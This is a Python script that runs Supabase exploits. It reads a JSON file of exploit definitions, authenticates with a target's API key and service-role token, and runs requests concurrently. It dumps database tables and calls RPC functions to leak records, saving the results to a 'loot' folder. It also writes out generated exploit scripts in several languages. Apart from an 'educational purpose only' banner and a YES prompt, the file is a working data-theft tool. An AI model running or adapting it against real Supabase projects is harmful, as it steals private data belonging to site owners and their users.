import httpx ,json ,asyncio ,os ,time 
from rich .console import Console 
from rich .panel import Panel 
from rich .table import Table 
from rich .progress import Progress ,SpinnerColumn ,TextColumn 
console =Console ()
async def run_exploit (auto_confirm =False ,output_dir =None ,overrides =None ):
    console .print ("\n")
    console .rule ("[bold red]SUPABASE EXPLOIT PoC RUNNER[/]")
    console .print ("[center bold yellow]EDUCATIONAL PURPOSE ONLY - DO NOT USE WITHOUT PERMISSION[/]",justify ="center")
    console .print ("\n")
    if not auto_confirm :
        confirm =console .input ("[bold yellow]   Type YES to continue: [/]").strip ().upper ()
        if confirm !="YES":
            console .print ("   [red]Aborted.[/]")
            return 
    else :
        console .print ("   [yellow][!] Auto-confirm enabled. Proceeding...[/]")

    if output_dir :
        report_dir =output_dir 
        poc_file =os .path .join (report_dir ,"exploit_generated.json")
    else :

        poc_file ="poc/exploit_generated.json"

    if not os .path .exists (poc_file ):
        console .print (f"   [red]{poc_file } not found[/]")
        return 
    with open (poc_file )as f :
        poc_data =json .load (f )


    if overrides :
        console .print ("[yellow][*] Applying custom payload overrides...[/]")
        for override in overrides :
            for exp in poc_data .get ("exploits",[]):
                if exp .get ("table")==override .get ("target")or exp .get ("rpc_name")==override .get ("target"):
                    if "payload"in override :
                        exp ["payload"]=override ["payload"]
                    if "filter"in override :
                        exp ["filter"]=override ["filter"]

    if output_dir :
        report_dir =output_dir 
    else :
        timestamp =int (time .time ())
        report_dir =f"exploit_report_{timestamp }"

    loot_dir =os .path .join (report_dir ,"loot")
    scripts_dir =os .path .join (report_dir ,"scripts")
    os .makedirs (loot_dir ,exist_ok =True )
    os .makedirs (scripts_dir ,exist_ok =True )
    with open (os .path .join (report_dir ,"exploit_generated.json"),"w",encoding ="utf-8")as f :
        json .dump (poc_data ,f ,indent =2 )
    if "exploit_scripts"in poc_data :
        save_exploit_scripts (poc_data ["exploit_scripts"],scripts_dir )
    exploits =poc_data .get ("exploits",[])
    if not exploits :
        console .print ("[yellow][!] No automated exploits found in POC data.[/]")
        return 
    target =poc_data ["target"].rstrip ("/")
    headers ={"apikey":poc_data .get ("apikey",""),"Authorization":f"Bearer {poc_data .get ('service_role_key','')}"if poc_data .get ("service_role_key")else ""}
    console .print (f"\n[bold cyan][*] Target: {target }[/]")
    console .print (f"[bold cyan][*] Output Directory: {report_dir }[/]\n")
    summary_results =[]
    async with httpx .AsyncClient (base_url =target ,headers =headers ,timeout =30 )as client :
        with Progress (SpinnerColumn (),TextColumn ("[progress.description]{task.description}"),console =console )as progress :
            task =progress .add_task ("[cyan]Running Exploits...",total =len (exploits ))

            async def execute_single_exploit (exp ):
                exp_type =exp ['type']
                target_name =exp .get ('table','')or exp .get ('rpc_name','')
                progress .update (task ,description =f"[cyan]Exploiting {exp_type } -> {target_name }...")
                status ="FAILED"
                details =""

                try :
                    if exp_type =="table_dump":
                        table =exp ["table"]
                        params =exp .get ("filter")or {"limit":500 }
                        r =await client .get (f"/rest/v1/{table }",params =params )
                        if r .status_code in (200 ,206 ):
                            data =r .json ()
                            count =len (data )
                            filename =os .path .join (loot_dir ,f"{table }_dump.json")
                            with open (filename ,"w",encoding ="utf-8")as f :
                                json .dump (data ,f ,indent =2 ,ensure_ascii =False )
                            status ="SUCCESS"
                            details =f"Dumped {count } rows"
                        else :
                            details =f"HTTP {r .status_code }"

                    elif exp_type =="rpc_data_leak":
                        r =await client .post (f"/rest/v1/rpc/{exp ['rpc_name']}",json =exp .get ("payload",{}))
                        if r .status_code in (200 ,206 ):
                            data =r .json ()
                            count =len (data )if isinstance (data ,list )else 1 
                            filename =os .path .join (loot_dir ,f"rpc_{exp ['rpc_name']}.json")
                            with open (filename ,"w",encoding ="utf-8")as f :
                                json .dump (data ,f ,indent =2 ,ensure_ascii =False )
                            status ="SUCCESS"
                            details =f"Leaked {count } records"
                        else :
                            details =f"HTTP {r .status_code }"
                except Exception as e :
                    details =str (e )

                progress .advance (task )
                return {"type":exp_type ,"target":target_name ,"status":status ,"details":details }

            summary_results =await asyncio .gather (*[execute_single_exploit (exp )for exp in exploits ])

    results_file =os .path .join (report_dir ,"exploit_results.json")
    try :
        with open (results_file ,"w",encoding ="utf-8")as f :
            json .dump (summary_results ,f ,indent =2 )
    except Exception as e :
        console .print (f"[red]Failed to save results: {e }[/]")

    table =Table (title ="Exploit Execution Summary",expand =True )
    table .add_column ("Type",style ="cyan")
    table .add_column ("Target",style ="magenta")
    table .add_column ("Status",justify ="center")
    table .add_column ("Details",style ="white")
    for res in summary_results :
        status_style ="green"if res ["status"]=="SUCCESS"else "red"
        table .add_row (res ["type"],res ["target"],f"[{status_style }]{res ['status']}[/]",res ["details"])
    console .print ("\n")
    console .print (table )
    console .print (f"\n[bold green]✔ Exploit Run Complete. Check '{report_dir }' for loot and scripts.[/]")
def save_exploit_scripts (scripts ,output_dir ):
    extensions ={
    "python":"py",
    "javascript":"js",
    "go":"go",
    "curl":"sh"
    }
    console .print (f"\n[bold cyan][*] Saving generated exploit scripts...[/]")
    for key ,code in scripts .items ():
        parts =key .split ("_",1 )
        lang =parts [0 ]
        suffix =f"_{parts [1 ]}"if len (parts )>1 else ""

        ext =extensions .get (lang ,"txt")
        filename =os .path .join (output_dir ,f"exploit_{lang }{suffix }.{ext }")
        try :
            with open (filename ,"w",encoding ="utf-8")as f :
                f .write (code )
            console .print (f"    [green]✔ Saved {key }: {filename }[/]")
        except Exception as e :
            console .print (f"    [red]! Failed to save {key }: {e }[/]")
if __name__ =="__main__":
    asyncio .run (run_exploit ())